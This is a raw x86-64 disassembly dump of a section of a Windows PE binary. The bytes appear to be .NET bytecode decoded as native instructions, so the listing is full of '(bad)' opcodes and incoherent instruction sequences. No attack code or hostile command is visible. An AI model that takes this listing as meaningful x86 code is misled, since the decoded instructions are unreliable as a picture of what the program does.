   140001a8c:	55                   	push   %rbp
   140001a8d:	07                   	(bad)
   140001a8e:	2a cc                	sub    %ah,%cl
   140001a90:	03 30                	add    (%rax),%esi
   140001a92:	03 00                	add    (%rax),%eax
   140001a94:	12 00                	adc    (%rax),%al
   140001a96:	00 00                	add    %al,(%rax)
   140001a98:	00 00                	add    %al,(%rax)
   140001a9a:	00 00                	add    %al,(%rax)
   140001a9c:	02 02                	add    (%rdx),%al
   140001a9e:	1f                   	(bad)
   140001a9f:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001aa2:	4c 1d 6a fe 03 d2    	rex.WR sbb $0xffffffffd203fe6a,%rax
   140001aa8:	2c 03                	sub    $0x3,%al
   140001aaa:	26 02 4c 2a cc       	es add -0x34(%rdx,%rbp,1),%cl
   140001aaf:	cc                   	int3
   140001ab0:	0b 30                	or     (%rax),%esi
   140001ab2:	03 00                	add    (%rax),%eax
   140001ab4:	2b 00                	sub    (%rax),%eax
   140001ab6:	00 00                	add    %al,(%rax)
   140001ab8:	00 00                	add    %al,(%rax)
   140001aba:	00 00                	add    %al,(%rax)
   140001abc:	02 16                	add    (%rsi),%dl
   140001abe:	1f                   	(bad)
   140001abf:	10 6a fe             	adc    %ch,-0x2(%rdx)
   140001ac2:	12 02                	adc    (%rdx),%al
   140001ac4:	fe                   	(bad)
   140001ac5:	18 02                	sbb    %al,(%rdx)
   140001ac7:	1f                   	(bad)
   140001ac8:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001acb:	16                   	(bad)
   140001acc:	6a 55                	push   $0x55
   140001ace:	02 1f                	add    (%rdi),%bl
   140001ad0:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001ad3:	16                   	(bad)
   140001ad4:	6a 55                	push   $0x55
   140001ad6:	de 0d fe 06 3a 00    	fimuls 0x3a06fe(%rip)        # 0x1403a21da
   140001adc:	00 06                	add    %al,(%rsi)
   140001ade:	02 28                	add    (%rax),%ch
   140001ae0:	7d 00                	jge    0x140001ae2
   140001ae2:	00 06                	add    %al,(%rsi)
   140001ae4:	dc 02                	faddl  (%rdx)
   140001ae6:	2a 00                	sub    (%rax),%al
   140001ae8:	41 1c 00             	rex.B sbb $0x0,%al
   140001aeb:	00 04 00             	add    %al,(%rax,%rax,1)
   140001aee:	00 00                	add    %al,(%rax)
   140001af0:	0a 00                	or     (%rax),%al
   140001af2:	00 00                	add    %al,(%rax)
   140001af4:	12 00                	adc    (%rax),%al
   140001af6:	00 00                	add    %al,(%rax)
   140001af8:	1c 00                	sbb    $0x0,%al
   140001afa:	00 00                	add    %al,(%rax)
   140001afc:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   140001b01:	00 00                	add    %al,(%rax)
   140001b03:	01 03                	add    %eax,(%rbx)
   140001b05:	30 03                	xor    %al,(%rbx)
   140001b07:	00 11                	add    %dl,(%rcx)
   140001b09:	00 00                	add    %al,(%rax)
   140001b0b:	00 14 00             	add    %dl,(%rax,%rax,1)
   140001b0e:	00 11                	add    %dl,(%rcx)
   140001b10:	03 02                	add    (%rdx),%eax
   140001b12:	59                   	pop    %rcx
   140001b13:	0a 04 02             	or     (%rdx,%rax,1),%al
   140001b16:	06                   	(bad)
   140001b17:	28 e6                	sub    %ah,%dh
   140001b19:	00 00                	add    %al,(%rax)
   140001b1b:	06                   	(bad)
   140001b1c:	26 06                	es (bad)
   140001b1e:	04 58                	add    $0x58,%al
   140001b20:	2a cc                	sub    %ah,%cl
   140001b22:	cc                   	int3
   140001b23:	cc                   	int3
   140001b24:	03 30                	add    (%rax),%esi
   140001b26:	02 00                	add    (%rax),%al
   140001b28:	1d 00 00 00 00       	sbb    $0x0,%eax
   140001b2d:	00 00                	add    %al,(%rax)
   140001b2f:	00 02                	add    %al,(%rdx)
   140001b31:	2d 03 16 6a 2a       	sub    $0x2a6a1603,%eax
   140001b36:	02 20                	add    (%rax),%ah
   140001b38:	00 10                	add    %dl,(%rax)
   140001b3a:	00 00                	add    %al,(%rax)
   140001b3c:	6a 37                	push   $0x37
   140001b3e:	07                   	(bad)
   140001b3f:	02 28                	add    (%rax),%ch
   140001b41:	78 00                	js     0x140001b43
   140001b43:	00 06                	add    %al,(%rsi)
   140001b45:	2a 02                	sub    (%rdx),%al
   140001b47:	28 e1                	sub    %ah,%cl
   140001b49:	00 00                	add    %al,(%rax)
   140001b4b:	06                   	(bad)
   140001b4c:	2a cc                	sub    %ah,%cl
   140001b4e:	cc                   	int3
   140001b4f:	cc                   	int3
   140001b50:	03 30                	add    (%rax),%esi
   140001b52:	02 00                	add    (%rax),%al
   140001b54:	45 00 00             	add    %r8b,(%r8)
   140001b57:	00 15 00 00 11 02    	add    %dl,0x2110000(%rip)        # 0x142111b5d
   140001b5d:	1e                   	(bad)
   140001b5e:	6a 58                	push   $0x58
   140001b60:	0d 02 4c 0a 06       	or     $0x60a4c02,%eax
   140001b65:	2c 39                	sub    $0x39,%al
   140001b67:	02 1f                	add    (%rdi),%bl
   140001b69:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001b6c:	4c 06                	rex.WR (bad)
   140001b6e:	59                   	pop    %rcx
   140001b6f:	19 63 1e             	sbb    %esp,0x1e(%rbx)
   140001b72:	6a 5a                	push   $0x5a
   140001b74:	0b 06                	or     (%rsi),%eax
   140001b76:	0c 07                	or     $0x7,%al
   140001b78:	20 00                	and    %al,(%rax)
   140001b7a:	10 00                	adc    %al,(%rax)
   140001b7c:	00 6a 37             	add    %ch,0x37(%rdx)
   140001b7f:	09 12                	or     %edx,(%rdx)
   140001b81:	02 12                	add    (%rdx),%dl
   140001b83:	01 28                	add    %ebp,(%rax)
   140001b85:	0a 00                	or     (%rax),%al
   140001b87:	00 06                	add    %al,(%rsi)
   140001b89:	08 07                	or     %al,(%rdi)
   140001b8b:	28 da                	sub    %bl,%dl
   140001b8d:	00 00                	add    %al,(%rax)
   140001b8f:	06                   	(bad)
   140001b90:	02 16                	add    (%rsi),%dl
   140001b92:	6a 55                	push   $0x55
   140001b94:	09 16                	or     %edx,(%rsi)
   140001b96:	6a 55                	push   $0x55
   140001b98:	02 1f                	add    (%rdi),%bl
   140001b9a:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001b9d:	16                   	(bad)
   140001b9e:	6a 55                	push   $0x55
   140001ba0:	2a 00                	sub    (%rax),%al
   140001ba2:	00 00                	add    %al,(%rax)
   140001ba4:	03 30                	add    (%rax),%esi
   140001ba6:	02 00                	add    (%rax),%al
   140001ba8:	15 00 00 00 00       	adc    $0x0,%eax
   140001bad:	00 00                	add    %al,(%rax)
   140001baf:	00 02                	add    %al,(%rdx)
   140001bb1:	16                   	(bad)
   140001bb2:	6a 55                	push   $0x55
   140001bb4:	02 1e                	add    (%rsi),%bl
   140001bb6:	6a 58                	push   $0x58
   140001bb8:	16                   	(bad)
   140001bb9:	6a 55                	push   $0x55
   140001bbb:	02 1f                	add    (%rdi),%bl
   140001bbd:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001bc0:	16                   	(bad)
   140001bc1:	6a 55                	push   $0x55
   140001bc3:	02 2a                	add    (%rdx),%ch
   140001bc5:	cc                   	int3
   140001bc6:	cc                   	int3
   140001bc7:	cc                   	int3
   140001bc8:	03 30                	add    (%rax),%esi
   140001bca:	00 00                	add    %al,(%rax)
   140001bcc:	01 00                	add    %eax,(%rax)
   140001bce:	00 00                	add    %al,(%rax)
   140001bd0:	00 00                	add    %al,(%rax)
   140001bd2:	00 00                	add    %al,(%rax)
   140001bd4:	2a 00                	sub    (%rax),%al
   140001bd6:	00 00                	add    %al,(%rax)
   140001bd8:	03 30                	add    (%rax),%esi
   140001bda:	02 00                	add    (%rax),%al
   140001bdc:	40 00 00             	rex add %al,(%rax)
   140001bdf:	00 16                	add    %dl,(%rsi)
   140001be1:	00 00                	add    %al,(%rax)
   140001be3:	11 02                	adc    %eax,(%rdx)
   140001be5:	1e                   	(bad)
   140001be6:	6a 58                	push   $0x58
   140001be8:	0d 02 4c 0a 06       	or     $0x60a4c02,%eax
   140001bed:	2c 34                	sub    $0x34,%al
   140001bef:	02 1f                	add    (%rdi),%bl
   140001bf1:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001bf4:	4c 06                	rex.WR (bad)
   140001bf6:	59                   	pop    %rcx
   140001bf7:	0b 06                	or     (%rsi),%eax
   140001bf9:	0c 07                	or     $0x7,%al
   140001bfb:	20 00                	and    %al,(%rax)
   140001bfd:	10 00                	adc    %al,(%rax)
   140001bff:	00 6a 37             	add    %ch,0x37(%rdx)
   140001c02:	09 12                	or     %edx,(%rdx)
   140001c04:	02 12                	add    (%rdx),%dl
   140001c06:	01 28                	add    %ebp,(%rax)
   140001c08:	0a 00                	or     (%rax),%al
   140001c0a:	00 06                	add    %al,(%rsi)
   140001c0c:	08 07                	or     %al,(%rdi)
   140001c0e:	28 da                	sub    %bl,%dl
   140001c10:	00 00                	add    %al,(%rax)
   140001c12:	06                   	(bad)
   140001c13:	02 16                	add    (%rsi),%dl
   140001c15:	6a 55                	push   $0x55
   140001c17:	09 16                	or     %edx,(%rsi)
   140001c19:	6a 55                	push   $0x55
   140001c1b:	02 1f                	add    (%rdi),%bl
   140001c1d:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001c20:	16                   	(bad)
   140001c21:	6a 55                	push   $0x55
   140001c23:	2a 03                	sub    (%rbx),%al
   140001c25:	30 02                	xor    %al,(%rdx)
   140001c27:	00 47 00             	add    %al,0x0(%rdi)
   140001c2a:	00 00                	add    %al,(%rax)
   140001c2c:	17                   	(bad)
   140001c2d:	00 00                	add    %al,(%rax)
   140001c2f:	11 02                	adc    %eax,(%rdx)
   140001c31:	1f                   	(bad)
   140001c32:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001c35:	4c 0b 07             	or     (%rdi),%r8
   140001c38:	1d 6a fe 03 d2       	sbb    $0xd203fe6a,%eax
   140001c3d:	2c 24                	sub    $0x24,%al
   140001c3f:	07                   	(bad)
   140001c40:	17                   	(bad)
   140001c41:	6a 58                	push   $0x58
   140001c43:	18 6a 5a             	sbb    %ch,0x5a(%rdx)
   140001c46:	0a 02                	or     (%rdx),%al
   140001c48:	4c 0c 06             	rex.WR or $0x6,%al
   140001c4b:	20 00                	and    %al,(%rax)
   140001c4d:	10 00                	adc    %al,(%rax)
   140001c4f:	00 6a 37             	add    %ch,0x37(%rdx)
   140001c52:	09 12                	or     %edx,(%rdx)
   140001c54:	02 12                	add    (%rdx),%dl
   140001c56:	00 28                	add    %ch,(%rax)
   140001c58:	0a 00                	or     (%rax),%al
   140001c5a:	00 06                	add    %al,(%rsi)
   140001c5c:	08 06                	or     %al,(%rsi)
   140001c5e:	28 da                	sub    %bl,%dl
   140001c60:	00 00                	add    %al,(%rax)
   140001c62:	06                   	(bad)
   140001c63:	02 1f                	add    (%rdi),%bl
   140001c65:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001c68:	16                   	(bad)
   140001c69:	6a 55                	push   $0x55
   140001c6b:	02 1f                	add    (%rdi),%bl
   140001c6d:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001c70:	1d 6a 55 02 16       	sbb    $0x1602556a,%eax
   140001c75:	53                   	push   %rbx
   140001c76:	2a 00                	sub    (%rax),%al
   140001c78:	03 30                	add    (%rax),%esi
   140001c7a:	03 00                	add    (%rax),%eax
   140001c7c:	1f                   	(bad)
   140001c7d:	00 00                	add    %al,(%rax)
   140001c7f:	00 00                	add    %al,(%rax)
   140001c81:	00 00                	add    %al,(%rax)
   140001c83:	00 02                	add    %al,(%rdx)
   140001c85:	03 1f                	add    (%rdi),%ebx
   140001c87:	20 6a 28             	and    %ch,0x28(%rdx)
   140001c8a:	e5 00                	in     $0x0,%eax
   140001c8c:	00 06                	add    %al,(%rsi)
   140001c8e:	26 03 1f             	es add (%rdi),%ebx
   140001c91:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001c94:	16                   	(bad)
   140001c95:	6a 55                	push   $0x55
   140001c97:	03 1f                	add    (%rdi),%ebx
   140001c99:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001c9c:	1d 6a 55 03 16       	sbb    $0x1603556a,%eax
   140001ca1:	53                   	push   %rbx
   140001ca2:	2a 00                	sub    (%rax),%al
   140001ca4:	03 30                	add    (%rax),%esi
   140001ca6:	03 00                	add    (%rax),%eax
   140001ca8:	0f 00 00             	sldt   (%rax)
   140001cab:	00 00                	add    %al,(%rax)
   140001cad:	00 00                	add    %al,(%rax)
   140001caf:	00 02                	add    %al,(%rdx)
   140001cb1:	03 04 28             	add    (%rax,%rbp,1),%eax
   140001cb4:	56                   	push   %rsi
   140001cb5:	00 00                	add    %al,(%rax)
   140001cb7:	06                   	(bad)
   140001cb8:	26 03 02             	es add (%rdx),%eax
   140001cbb:	59                   	pop    %rcx
   140001cbc:	04 58                	add    $0x58,%al
   140001cbe:	2a 00                	sub    (%rax),%al
   140001cc0:	03 30                	add    (%rax),%esi
   140001cc2:	01 00                	add    %eax,(%rax)
   140001cc4:	0d 00 00 00 18       	or     $0x18000000,%eax
   140001cc9:	00 00                	add    %al,(%rax)
   140001ccb:	11 02                	adc    %eax,(%rdx)
   140001ccd:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140001cd0:	2c 06                	sub    $0x6,%al
   140001cd2:	06                   	(bad)
   140001cd3:	28 37                	sub    %dh,(%rdi)
   140001cd5:	00 00                	add    %al,(%rax)
   140001cd7:	06                   	(bad)
   140001cd8:	2a cc                	sub    %ah,%cl
   140001cda:	cc                   	int3
   140001cdb:	cc                   	int3
   140001cdc:	03 30                	add    (%rax),%esi
   140001cde:	01 00                	add    %eax,(%rax)
   140001ce0:	0a 00                	or     (%rax),%al
   140001ce2:	00 00                	add    %al,(%rax)
   140001ce4:	00 00                	add    %al,(%rax)
   140001ce6:	00 00                	add    %al,(%rax)
   140001ce8:	21 fe                	and    %edi,%esi
   140001cea:	ff                   	(bad)
   140001ceb:	ff                   	(bad)
   140001cec:	ff                   	(bad)
   140001ced:	ff                   	(bad)
   140001cee:	ff                   	(bad)
   140001cef:	ff                   	(bad)
   140001cf0:	7f 2a                	jg     0x140001d1c
   140001cf2:	cc                   	int3
   140001cf3:	cc                   	int3
   140001cf4:	03 30                	add    (%rax),%esi
   140001cf6:	01 00                	add    %eax,(%rax)
   140001cf8:	0a 00                	or     (%rax),%al
   140001cfa:	00 00                	add    %al,(%rax)
   140001cfc:	00 00                	add    %al,(%rax)
   140001cfe:	00 00                	add    %al,(%rax)
   140001d00:	21 ff                	and    %edi,%edi
   140001d02:	ff                   	(bad)
   140001d03:	ff                   	(bad)
   140001d04:	ff                   	(bad)
   140001d05:	ff                   	(bad)
   140001d06:	ff                   	(bad)
   140001d07:	ff                   	(bad)
   140001d08:	7f 2a                	jg     0x140001d34
   140001d0a:	cc                   	int3
   140001d0b:	cc                   	int3
   140001d0c:	03 30                	add    (%rax),%esi
   140001d0e:	01 00                	add    %eax,(%rax)
   140001d10:	0a 00                	or     (%rax),%al
   140001d12:	00 00                	add    %al,(%rax)
   140001d14:	00 00                	add    %al,(%rax)
   140001d16:	00 00                	add    %al,(%rax)
   140001d18:	21 ff                	and    %edi,%edi
   140001d1a:	ff                   	(bad)
   140001d1b:	ff                   	(bad)
   140001d1c:	ff                   	(bad)
   140001d1d:	ff                   	(bad)
   140001d1e:	ff                   	(bad)
   140001d1f:	ff 03                	incl   (%rbx)
   140001d21:	2a cc                	sub    %ah,%cl
   140001d23:	cc                   	int3
   140001d24:	03 30                	add    (%rax),%esi
   140001d26:	04 00                	add    $0x0,%al
   140001d28:	79 01                	jns    0x140001d2b
   140001d2a:	00 00                	add    %al,(%rax)
   140001d2c:	19 00                	sbb    %eax,(%rax)
   140001d2e:	00 11                	add    %dl,(%rcx)
   140001d30:	02 4c 0a 02          	add    0x2(%rdx,%rcx,1),%cl
   140001d34:	1e                   	(bad)
   140001d35:	6a 58                	push   $0x58
   140001d37:	4c 13 0e             	adc    (%rsi),%r9
   140001d3a:	06                   	(bad)
   140001d3b:	11 0e                	adc    %ecx,(%rsi)
   140001d3d:	3b 65 01             	cmp    0x1(%rbp),%esp
   140001d40:	00 00                	add    %al,(%rax)
   140001d42:	06                   	(bad)
   140001d43:	28 3b                	sub    %bh,(%rbx)
   140001d45:	00 00                	add    %al,(%rax)
   140001d47:	06                   	(bad)
   140001d48:	28 d4                	sub    %dl,%ah
   140001d4a:	00 00                	add    %al,(%rax)
   140001d4c:	06                   	(bad)
   140001d4d:	0c 08                	or     $0x8,%al
   140001d4f:	39 45 01             	cmp    %eax,0x1(%rbp)
   140001d52:	00 00                	add    %al,(%rax)
   140001d54:	08 1f                	or     %bl,(%rdi)
   140001d56:	3c 6a                	cmp    $0x6a,%al
   140001d58:	58                   	pop    %rax
   140001d59:	fe                   	(bad)
   140001d5a:	12 02                	adc    (%rdx),%al
   140001d5c:	4a 6a 08             	rex.WX push $0x8
   140001d5f:	58                   	pop    %rax
   140001d60:	13 0d 11 0d 20 a0    	adc    -0x5fdff2ef(%rip),%ecx        # 0xe0202a77
   140001d66:	00 00                	add    %al,(%rax)
   140001d68:	00 6a 58             	add    %ch,0x58(%rdx)
   140001d6b:	4a 13 0c 11          	adc    (%rcx,%r10,1),%rcx
   140001d6f:	0c 39                	or     $0x39,%al
   140001d71:	24 01                	and    $0x1,%al
   140001d73:	00 00                	add    %al,(%rax)
   140001d75:	11 0c 6e             	adc    %ecx,(%rsi,%rbp,2)
   140001d78:	08 58 13             	or     %bl,0x13(%rax)
   140001d7b:	0b 11                	or     (%rcx),%edx
   140001d7d:	0d 20 a4 00 00       	or     $0xa420,%eax
   140001d82:	00 6a 58             	add    %ch,0x58(%rdx)
   140001d85:	4a 6e                	rex.WX outsb (%rsi),(%dx)
   140001d87:	1f                   	(bad)
   140001d88:	0c 6a                	or     $0x6a,%al
   140001d8a:	5c                   	pop    %rsp
   140001d8b:	6d                   	insl   (%dx),(%rdi)
   140001d8c:	13 0a                	adc    (%rdx),%ecx
   140001d8e:	16                   	(bad)
   140001d8f:	13 05 16 11 0a 41    	adc    0x410a1116(%rip),%eax        # 0x1810a2eab
   140001d95:	00 01                	add    %al,(%rcx)
   140001d97:	00 00                	add    %al,(%rax)
   140001d99:	06                   	(bad)
   140001d9a:	1f                   	(bad)
   140001d9b:	38 6a 58             	cmp    %ch,0x58(%rdx)
   140001d9e:	1f                   	(bad)
   140001d9f:	18 6a 59             	sbb    %ch,0x59(%rdx)
   140001da2:	4a 13 09             	rex.WX adc (%rcx),%rcx
   140001da5:	11 0b                	adc    %ecx,(%rbx)
   140001da7:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140001daa:	04 4a                	add    $0x4a,%al
   140001dac:	11 09                	adc    %ecx,(%rcx)
   140001dae:	35 0a 11 09 11       	xor    $0x1109110a,%eax
   140001db3:	04 1a                	add    $0x1a,%al
   140001db5:	6a 58                	push   $0x58
   140001db7:	4a 37                	rex.WX (bad)
   140001db9:	19 11                	sbb    %edx,(%rcx)
   140001dbb:	05 17 58 13 05       	add    $0x5135817,%eax
   140001dc0:	11 04 1f             	adc    %eax,(%rdi,%rbx,1)
   140001dc3:	0c 6a                	or     $0x6a,%al
   140001dc5:	58                   	pop    %rax
   140001dc6:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140001dc9:	05 11 0a 41 c8       	add    $0xc8410a11,%eax
   140001dce:	00 00                	add    %al,(%rax)
   140001dd0:	00 2b                	add    %ch,(%rbx)
   140001dd2:	d6                   	udb
   140001dd3:	11 0b                	adc    %ecx,(%rbx)
   140001dd5:	11 05 6e 1f 0c 6a    	adc    %eax,0x6a0c1f6e(%rip)        # 0x1aa0c3d49
   140001ddb:	5a                   	pop    %rdx
   140001ddc:	58                   	pop    %rax
   140001ddd:	1e                   	(bad)
   140001dde:	6a 58                	push   $0x58
   140001de0:	4a 6e                	rex.WX outsb (%rsi),(%dx)
   140001de2:	08 58 0b             	or     %bl,0xb(%rax)
   140001de5:	06                   	(bad)
   140001de6:	1f                   	(bad)
   140001de7:	38 6a 58             	cmp    %ch,0x58(%rdx)
   140001dea:	07                   	(bad)
   140001deb:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001dee:	47 54                	rex.RXB push %r12
   140001df0:	16                   	(bad)
   140001df1:	0d 16 07 18 6a       	or     $0x6a180716,%eax
   140001df6:	58                   	pop    %rax
   140001df7:	47                   	rex.RXB
   140001df8:	41 82                	rex.B (bad)
   140001dfa:	00 00                	add    %al,(%rax)
   140001dfc:	00 07                	add    %al,(%rdi)
   140001dfe:	1a 6a 58             	sbb    0x58(%rdx),%ch
   140001e01:	13 06                	adc    (%rsi),%eax
   140001e03:	12 0f                	adc    (%rdi),%cl
   140001e05:	11 06                	adc    %eax,(%rsi)
   140001e07:	18 fe                	sbb    %bh,%dh
   140001e09:	12 02                	adc    (%rdx),%al
   140001e0b:	fe                   	(bad)
   140001e0c:	17                   	(bad)
   140001e0d:	12 0f                	adc    (%rdi),%cl
   140001e0f:	17                   	(bad)
   140001e10:	58                   	pop    %rax
   140001e11:	47 1f                	rex.RXB (bad)
   140001e13:	0f 5f 13             	maxps  (%rbx),%xmm2
   140001e16:	08 11                	or     %dl,(%rcx)
   140001e18:	08 2d 34 06 1f 24    	or     %ch,0x241f0634(%rip)        # 0x1641f2452
   140001e1e:	6a 58                	push   $0x58
   140001e20:	06                   	(bad)
   140001e21:	1f                   	(bad)
   140001e22:	24 6a                	and    $0x6a,%al
   140001e24:	58                   	pop    %rax
   140001e25:	4a 1e                	rex.WX (bad)
   140001e27:	58                   	pop    %rax
   140001e28:	54                   	push   %rsp
   140001e29:	12 0f                	adc    (%rdi),%cl
   140001e2b:	17                   	(bad)
   140001e2c:	58                   	pop    %rax
   140001e2d:	47 20 f0             	rex.RXB and %r14b,%r8b
   140001e30:	00 00                	add    %al,(%rax)
   140001e32:	00 5f d2             	add    %bl,-0x2e(%rdi)
   140001e35:	1f                   	(bad)
   140001e36:	50                   	push   %rax
   140001e37:	33 33                	xor    (%rbx),%esi
   140001e39:	06                   	(bad)
   140001e3a:	1f                   	(bad)
   140001e3b:	38 6a 58             	cmp    %ch,0x58(%rdx)
   140001e3e:	1a 6a 59             	sbb    0x59(%rdx),%ch
   140001e41:	17                   	(bad)
   140001e42:	54                   	push   %rsp
   140001e43:	06                   	(bad)
   140001e44:	1f                   	(bad)
   140001e45:	38 6a 58             	cmp    %ch,0x58(%rdx)
   140001e48:	1a 6a 58             	sbb    0x58(%rdx),%ch
   140001e4b:	09 54 2b 1d          	or     %edx,0x1d(%rbx,%rbp,1)
   140001e4f:	11 08                	adc    %ecx,(%rax)
   140001e51:	18 33                	sbb    %dh,(%rbx)
   140001e53:	18 06                	sbb    %al,(%rsi)
   140001e55:	1f                   	(bad)
   140001e56:	24 6a                	and    $0x6a,%al
   140001e58:	58                   	pop    %rax
   140001e59:	06                   	(bad)
   140001e5a:	1f                   	(bad)
   140001e5b:	24 6a                	and    $0x6a,%al
   140001e5d:	58                   	pop    %rax
   140001e5e:	4a 12 0f             	rex.WX adc (%rdi),%cl
   140001e61:	17                   	(bad)
   140001e62:	58                   	pop    %rax
   140001e63:	47 1a 64 1e 5a       	sbb    0x5a(%r14,%r11,1),%r12b
   140001e68:	1e                   	(bad)
   140001e69:	58                   	pop    %rax
   140001e6a:	58                   	pop    %rax
   140001e6b:	54                   	push   %rsp
   140001e6c:	09 17                	or     %edx,(%rdi)
   140001e6e:	58                   	pop    %rax
   140001e6f:	0d 11 06 18 6a       	or     $0x6a180611,%eax
   140001e74:	58                   	pop    %rax
   140001e75:	13 06                	adc    (%rsi),%eax
   140001e77:	09 07                	or     %eax,(%rdi)
   140001e79:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001e7c:	47 32 84 07 19 6a 58 	xor    0x47586a19(%r15,%r8,1),%r8b
   140001e83:	47 
   140001e84:	1f                   	(bad)
   140001e85:	0f 5f 13             	maxps  (%rbx),%xmm2
   140001e88:	07                   	(bad)
   140001e89:	11 07                	adc    %eax,(%rdi)
   140001e8b:	2c 0c                	sub    $0xc,%al
   140001e8d:	11 07                	adc    %eax,(%rdi)
   140001e8f:	1b 33                	sbb    (%rbx),%esi
   140001e91:	07                   	(bad)
   140001e92:	06                   	(bad)
   140001e93:	1f                   	(bad)
   140001e94:	30 6a 58             	xor    %ch,0x58(%rdx)
   140001e97:	17                   	(bad)
   140001e98:	54                   	push   %rsp
   140001e99:	06                   	(bad)
   140001e9a:	1f                   	(bad)
   140001e9b:	40 6a 58             	rex push $0x58
   140001e9e:	0a 06                	or     (%rsi),%al
   140001ea0:	11 0e                	adc    %ecx,(%rsi)
   140001ea2:	40                   	rex
   140001ea3:	9b                   	fwait
   140001ea4:	fe                   	(bad)
   140001ea5:	ff                   	(bad)
   140001ea6:	ff 16                	call   *(%rsi)
   140001ea8:	2a cc                	sub    %ah,%cl
   140001eaa:	cc                   	int3
   140001eab:	cc                   	int3
   140001eac:	03 30                	add    (%rax),%esi
   140001eae:	01 00                	add    %eax,(%rax)
   140001eb0:	07                   	(bad)
   140001eb1:	00 00                	add    %al,(%rax)
   140001eb3:	00 00                	add    %al,(%rax)
   140001eb5:	00 00                	add    %al,(%rax)
   140001eb7:	00 02                	add    %al,(%rdx)
   140001eb9:	28 37                	sub    %dh,(%rdi)
   140001ebb:	00 00                	add    %al,(%rax)
   140001ebd:	06                   	(bad)
   140001ebe:	2a cc                	sub    %ah,%cl
   140001ec0:	0b 30                	or     (%rax),%esi
   140001ec2:	02 00                	add    (%rax),%al
   140001ec4:	16                   	(bad)
   140001ec5:	00 00                	add    %al,(%rax)
   140001ec7:	00 00                	add    %al,(%rax)
   140001ec9:	00 00                	add    %al,(%rax)
   140001ecb:	00 02                	add    %al,(%rdx)
   140001ecd:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   140001ed0:	00 06                	add    %al,(%rsi)
   140001ed2:	de 0d fe 06 2e 00    	fimuls 0x2e06fe(%rip)        # 0x1402e25d6
   140001ed8:	00 06                	add    %al,(%rsi)
   140001eda:	02 28                	add    (%rax),%ch
   140001edc:	7d 00                	jge    0x140001ede
   140001ede:	00 06                	add    %al,(%rsi)
   140001ee0:	dc 2a                	fsubrl (%rdx)
   140001ee2:	00 00                	add    %al,(%rax)
   140001ee4:	41 1c 00             	rex.B sbb $0x0,%al
   140001ee7:	00 04 00             	add    %al,(%rax,%rax,1)
   140001eea:	00 00                	add    %al,(%rax)
   140001eec:	00 00                	add    %al,(%rax)
   140001eee:	00 00                	add    %al,(%rax)
   140001ef0:	08 00                	or     %al,(%rax)
   140001ef2:	00 00                	add    %al,(%rax)
   140001ef4:	08 00                	or     %al,(%rax)
   140001ef6:	00 00                	add    %al,(%rax)
   140001ef8:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   140001efd:	00 00                	add    %al,(%rax)
   140001eff:	01 0b                	add    %ecx,(%rbx)
   140001f01:	30 02                	xor    %al,(%rdx)
   140001f03:	00 1f                	add    %bl,(%rdi)
   140001f05:	00 00                	add    %al,(%rax)
   140001f07:	00 00                	add    %al,(%rax)
   140001f09:	00 00                	add    %al,(%rax)
   140001f0b:	00 02                	add    %al,(%rdx)
   140001f0d:	28 50 00             	sub    %dl,0x0(%rax)
   140001f10:	00 06                	add    %al,(%rsi)
   140001f12:	26 02 03             	es add (%rbx),%al
   140001f15:	28 3d 00 00 06 de    	sub    %bh,-0x21fa0000(%rip)        # 0x11e061f1b
   140001f1b:	0d fe 06 2e 00       	or     $0x2e06fe,%eax
   140001f20:	00 06                	add    %al,(%rsi)
   140001f22:	02 28                	add    (%rax),%ch
   140001f24:	7d 00                	jge    0x140001f26
   140001f26:	00 06                	add    %al,(%rsi)
   140001f28:	dc 02                	faddl  (%rdx)
   140001f2a:	2a 00                	sub    (%rax),%al
   140001f2c:	41 1c 00             	rex.B sbb $0x0,%al
   140001f2f:	00 04 00             	add    %al,(%rax,%rax,1)
   140001f32:	00 00                	add    %al,(%rax)
   140001f34:	07                   	(bad)
   140001f35:	00 00                	add    %al,(%rax)
   140001f37:	00 09                	add    %cl,(%rcx)
   140001f39:	00 00                	add    %al,(%rax)
   140001f3b:	00 10                	add    %dl,(%rax)
   140001f3d:	00 00                	add    %al,(%rax)
   140001f3f:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b001f45
   140001f45:	00 00                	add    %al,(%rax)
   140001f47:	01 03                	add    %eax,(%rbx)
   140001f49:	30 02                	xor    %al,(%rdx)
   140001f4b:	00 1f                	add    %bl,(%rdi)
   140001f4d:	00 00                	add    %al,(%rax)
   140001f4f:	00 14 00             	add    %dl,(%rax,%rax,1)
   140001f52:	00 11                	add    %dl,(%rcx)
   140001f54:	03 4c 0a 06          	add    0x6(%rdx,%rcx,1),%ecx
   140001f58:	21 ff                	and    %edi,%edi
   140001f5a:	ff                   	(bad)
   140001f5b:	ff                   	(bad)
   140001f5c:	ff                   	(bad)
   140001f5d:	ff                   	(bad)
   140001f5e:	ff                   	(bad)
   140001f5f:	ff 03                	incl   (%rbx)
   140001f61:	36 05 28 09 00 00    	ss add $0x928,%eax
   140001f67:	06                   	(bad)
   140001f68:	06                   	(bad)
   140001f69:	1f                   	(bad)
   140001f6a:	40 6a 5a             	rex push $0x5a
   140001f6d:	28 74 00 00          	sub    %dh,0x0(%rax,%rax,1)
   140001f71:	06                   	(bad)
   140001f72:	2a cc                	sub    %ah,%cl
   140001f74:	03 30                	add    (%rax),%esi
   140001f76:	02 00                	add    (%rax),%al
   140001f78:	1e                   	(bad)
   140001f79:	00 00                	add    %al,(%rax)
   140001f7b:	00 14 00             	add    %dl,(%rax,%rax,1)
   140001f7e:	00 11                	add    %dl,(%rcx)
